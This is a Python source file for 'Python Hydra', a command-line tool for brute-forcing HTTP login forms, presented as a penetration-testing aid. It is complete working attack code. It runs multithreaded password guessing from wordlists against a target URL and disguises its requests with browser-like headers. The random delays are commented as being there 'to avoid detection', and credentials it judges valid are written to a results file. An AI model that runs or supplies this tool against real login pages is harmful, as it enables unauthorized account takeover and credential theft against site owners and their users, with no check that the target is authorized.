#!/usr/bin/env python3
"""
Python Hydra - HTTP Authentication Brute Force Tool
A professional and dynamic tool for penetration testing HTTP authentication systems.

Author: Abdikafi Isse Isak (miirshe)
Email: miirshe@gmail.com
Version: 1.0.0
License: MIT
"""

import requests
import argparse
import json
import time
import random
import sys
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
from typing import Dict, List, Optional, Tuple
import os

class PythonHydra:
    """Main class for Python Hydra HTTP authentication brute forcing."""
    
    def __init__(self, config: Dict = None):
        """Initialize Python Hydra with configuration."""
        self.config = config or {}
        self.session = requests.Session()
        self.successful_credentials = []
        self.failed_attempts = 0
        self.total_attempts = 0
        
        # Setup logging
        self.setup_logging()
        
        # Setup session
        self.setup_session()
    
    def setup_logging(self):
        """Setup logging configuration."""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('python_hydra.log'),
                logging.StreamHandler(sys.stdout)
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def setup_session(self):
        """Setup HTTP session with default headers and cookies."""
        # Default headers that look more legitimate
        default_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Cache-Control": "max-age=0"
        }
        
        # Update with custom headers if provided
        if 'headers' in self.config:
            default_headers.update(self.config['headers'])
        
        self.session.headers.update(default_headers)
        
        # Set cookies if provided
        if 'cookies' in self.config:
            self.session.cookies.update(self.config['cookies'])
    
    def load_wordlist(self, wordlist_path: str) -> List[str]:
        """Load wordlist from file."""
        try:
            with open(wordlist_path, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            self.logger.error(f"Wordlist file not found: {wordlist_path}")
            return []
        except Exception as e:
            self.logger.error(f"Error loading wordlist: {e}")
            return []
    
    def load_usernames(self, username_input: str) -> List[str]:
        """Load usernames from file or string."""
        if os.path.isfile(username_input):
            try:
                with open(username_input, 'r', encoding='utf-8') as f:
                    return [line.strip() for line in f if line.strip()]
            except Exception as e:
                self.logger.error(f"Error loading username file: {e}")
                return []
        else:
            # Treat as comma-separated usernames
            return [u.strip() for u in username_input.split(',') if u.strip()]
    
    def test_credentials(self, url: str, username: str, password: str, 
                        form_data: Dict, success_indicators: List[str], 
                        failure_indicators: List[str]) -> Tuple[bool, str]:
        """Test a single username/password combination."""
        try:
            # Prepare form data
            data = form_data.copy()
            data.update({
                'username': username,
                'password': password
            })
            
            # Add random delay to avoid detection
            if self.config.get('delay', 0) > 0:
                time.sleep(random.uniform(0.1, self.config['delay']))
            
            # Make request
            response = self.session.post(
                url, 
                data=data, 
                allow_redirects=True,
                timeout=self.config.get('timeout', 30)
            )
            
            self.total_attempts += 1
            
            # Check for failure indicators FIRST (like your working code)
            for indicator in failure_indicators:
                if indicator.lower() in response.text.lower():
                    return False, f"Failure indicator found: {indicator}"
            
            # If no failure indicators found, it's likely a success
            # This matches your working approach: "if 'Username or Password is invalid' not in response.text"
            return True, "No failure indicators found (likely success)"
                
        except requests.exceptions.RequestException as e:
            self.logger.warning(f"Request failed for {username}:{password} - {e}")
            return False, f"Request error: {e}"
        except Exception as e:
            self.logger.error(f"Unexpected error: {e}")
            return False, f"Error: {e}"
    

    
    def brute_force(self, url: str, usernames: List[str], passwords: List[str],
                    form_data: Dict, success_indicators: List[str],
                    failure_indicators: List[str], max_workers: int = 5) -> None:
        """Perform brute force attack with multiple threads."""
        self.logger.info(f"\033[94mStarting brute force attack on {url}\033[0m")
        self.logger.info(f"\033[94mTesting {len(usernames)} usernames with {len(passwords)} passwords\033[0m")
        self.logger.info(f"\033[94mTotal combinations: {len(usernames) * len(passwords)}\033[0m")
        
        # Create all combinations
        combinations = [(u, p) for u in usernames for p in passwords]
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            # Submit all tasks
            future_to_creds = {
                executor.submit(
                    self.test_credentials, 
                    url, u, p, 
                    form_data, 
                    success_indicators, 
                    failure_indicators
                ): (u, p) for u, p in combinations
            }
            
            # Process completed tasks
            for future in as_completed(future_to_creds):
                username, password = future_to_creds[future]
                try:
                    success, message = future.result()
                    
                    if success:
                        self.successful_credentials.append({
                            'username': username,
                            'password': password,
                            'message': message
                        })
                        self.logger.info(f"\033[92m[+] SUCCESS: {username}:{password} - {message}\033[0m")
                        
                        # Stop if we only want first success
                        if self.config.get('stop_on_first', False):
                            executor.shutdown(wait=False)
                            break
                    else:
                        self.failed_attempts += 1
                        self.logger.debug(f"\033[91m[-] Failed: {username}:{password} - {message}\033[0m")
                        
                        # Progress indicator
                        if self.total_attempts % 100 == 0:
                            self.logger.info(f"\033[93mProgress: {self.total_attempts}/{len(combinations)} attempts\033[0m")
                            
                except Exception as e:
                    self.logger.error(f"Error processing {username}:{password} - {e}")
                    self.failed_attempts += 1
        
        self.logger.info("\033[95mBrute force attack completed!\033[0m")
        self.logger.info(f"\033[92mSuccessful attempts: {len(self.successful_credentials)}\033[0m")
        self.logger.info(f"\033[91mFailed attempts: {self.failed_attempts}\033[0m")
        self.logger.info(f"\033[93mTotal attempts: {self.total_attempts}\033[0m")
    
    def save_results(self, output_file: str = None):
        """Save results to file."""
        if not output_file:
            output_file = f"hydra_results_{int(time.time())}.json"
        
        results = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'successful_credentials': self.successful_credentials,
            'statistics': {
                'total_attempts': self.total_attempts,
                'failed_attempts': self.failed_attempts,
                'success_rate': len(self.successful_credentials) / max(self.total_attempts, 1) * 100
            }
        }
        
        try:
            with open(output_file, 'w') as f:
                json.dump(results, f, indent=2)
            self.logger.info(f"\033[92mResults saved to {output_file}\033[0m")
        except Exception as e:
            self.logger.error(f"\033[91mError saving results: {e}\033[0m")

def load_config(config_file: str) -> Dict:
    """Load configuration from JSON file."""
    try:
        with open(config_file, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        print(f"Config file not found: {config_file}")
        return {}
    except json.JSONDecodeError:
        print(f"Invalid JSON in config file: {config_file}")
        return {}



def main():
    """Main function with command line interface."""
    
    # Display author information with colors
    print("\033[95m" + "="*60 + "\033[0m")
    print("\033[96m" + "🐍 Python Hydra - HTTP Authentication Brute Force Tool" + "\033[0m")
    print("\033[95m" + "="*60 + "\033[0m")
    print("\033[93m" + "👨‍💻 Software Engineer | AI, Web & Cybersecurity Enthusiast" + "\033[0m")
    print("\033[92m" + "Author: Abdikafi Isse Isak (miirshe)" + "\033[0m")
    print("\033[92m" + "Email: miirshe@gmail.com" + "\033[0m")
    print("\033[95m" + "="*60 + "\033[0m\n")
    
    parser = argparse.ArgumentParser(
        description="Python Hydra - HTTP Authentication Brute Force Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python python_hydra.py -u admin -p pass.txt -t https://example.com/login
  python python_hydra.py -c config.json -U users.txt -P pass.txt
  python python_hydra.py -u admin -p pass.txt -t https://example.com/login --interactive
        """
    )
    
    parser.add_argument('-t', '--target', help='Target URL')
    parser.add_argument('-u', '--username', help='Username or username file')
    parser.add_argument('-U', '--usernames', help='Username file')
    parser.add_argument('-p', '--password', help='Password file')
    parser.add_argument('-P', '--passwords', help='Password file (alternative)')
    parser.add_argument('-c', '--config', help='Configuration file')
    parser.add_argument('-o', '--output', help='Output file for results')

    parser.add_argument('--delay', type=float, default=0.5, help='Delay between requests (seconds)')
    parser.add_argument('--threads', type=int, default=5, help='Number of threads')
    parser.add_argument('--stop-first', action='store_true', help='Stop on first successful login')
    parser.add_argument('--interactive', '-i', action='store_true', help='Interactive mode to enter failure message')
    parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    

    
    # Setup logging level
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Load configuration
    config = {}
    if args.config:
        config = load_config(args.config)
    
    # Override config with command line arguments
    if args.delay:
        config['delay'] = args.delay
    if args.threads:
        config['max_workers'] = args.threads
    if args.stop_first:
        config['stop_on_first'] = True

    
    # Validate required arguments
    if not args.target and 'target' not in config:
        parser.error("Target URL is required (use -t or config file)")
    
    if not args.username and not args.usernames and 'usernames' not in config:
        parser.error("Username(s) are required (use -u/-U or config file)")
    
    if not args.password and not args.passwords and 'passwords' not in config:
        parser.error("Password file is required (use -p/-P or config file)")
    
    # Initialize Python Hydra
    hydra = PythonHydra(config)
    
    # Get target information
    target_url = args.target or config['target']['url']
    
    # Get usernames
    if args.username:
        usernames = hydra.load_usernames(args.username)
    elif args.usernames:
        usernames = hydra.load_usernames(args.usernames)
    else:
        usernames = config.get('usernames', [])
    
    # Get passwords
    password_file = args.password or args.passwords or config.get('passwords', 'pass.txt')
    passwords = hydra.load_wordlist(password_file)
    
    if not usernames or not passwords:
        print("Error: No usernames or passwords loaded")
        return
    
    # Get form data and indicators
    if 'target' in config:
        form_data = config['target'].get('form_data', {})
        success_indicators = config['target'].get('success_indicators', [])
        failure_indicators = config['target'].get('failure_indicators', [])
    else:
        # Default form data (adjust based on your target)
        form_data = {'username': '', 'password': '', 'submit': 'Login'}
        success_indicators = ['welcome', 'dashboard', 'logout', 'success']
        failure_indicators = ['invalid', 'failed', 'incorrect', 'error']
    
    # Interactive mode: Let user enter failure message
    if args.interactive or not failure_indicators:
        print("\n\033[93m" + "="*50 + "\033[0m")
        print("\033[96m" + "🔍 INTERACTIVE FAILURE MESSAGE SETUP" + "\033[0m")
        print("\033[93m" + "="*50 + "\033[0m")
        
        print("\n\033[94mTo find the correct failure message:\033[0m")
        print("1. Try logging in with wrong credentials manually")
        print("2. Look for error messages like 'Invalid password', 'Login failed', etc.")
        print("3. Copy the exact text that appears when login fails\n")
        
        # Get failure message from user
        failure_message = input("\033[92mEnter the exact failure message: \033[0m").strip()
        
        if failure_message:
            failure_indicators = [failure_message]
            print(f"\033[92m✓ Failure message set to: '{failure_message}'\033[0m")
        else:
            print("\033[91m✗ No failure message entered. Using defaults.\033[0m")
        
        print("\033[93m" + "="*50 + "\033[0m\n")
        
        # Option to test the failure message
        test_failure = input("\033[93mDo you want to test the failure message first? (y/n): \033[0m").strip().lower()
        
        if test_failure in ['y', 'yes']:
            print("\n\033[94mTesting failure message detection...\033[0m")
            print(f"Target URL: {target_url}")
            print(f"Failure message: '{failure_indicators[0]}'")
            
            # Test with dummy credentials
            test_response = requests.post(
                target_url,
                data={'username': 'test', 'password': 'test', 'submit': 'Login'},
                headers=hydra.session.headers,
                cookies=hydra.session.cookies,
                timeout=30
            )
            
            if failure_indicators[0].lower() in test_response.text.lower():
                print("\033[92m✓ Failure message detected correctly!\033[0m")
            else:
                print("\033[91m✗ Failure message NOT found in response!\033[0m")
                print("\033[93mYou may need to adjust the failure message.\033[0m")
            
            print("\033[93m" + "="*50 + "\033[0m\n")
    
    # Start brute force attack
    try:
        hydra.brute_force(
            target_url, usernames, passwords, form_data,
            success_indicators, failure_indicators,
            max_workers=config.get('max_workers', 5)
        )
        
        # Save results
        hydra.save_results(args.output)
        
        # Display results
        if hydra.successful_credentials:
            print("\n" + "\033[95m" + "="*50 + "\033[0m")
            print("\033[92m" + "SUCCESSFUL CREDENTIALS FOUND:" + "\033[0m")
            print("\033[95m" + "="*50 + "\033[0m")
            for cred in hydra.successful_credentials:
                print(f"\033[96mUsername: {cred['username']}\033[0m")
                print(f"\033[96mPassword: {cred['password']}\033[0m")
                print(f"\033[96mMessage: {cred['message']}\033[0m")
                print("\033[93m" + "-" * 30 + "\033[0m")
        else:
            print("\n\033[91mNo successful logins found.\033[0m")
            
    except KeyboardInterrupt:
        print("\n\033[93mAttack interrupted by user\033[0m")
        hydra.save_results(args.output)
    except Exception as e:
        print(f"\033[91mError during attack: {e}\033[0m")
        logging.error(f"\033[91mAttack failed: {e}\033[0m")

if __name__ == "__main__":
    main()
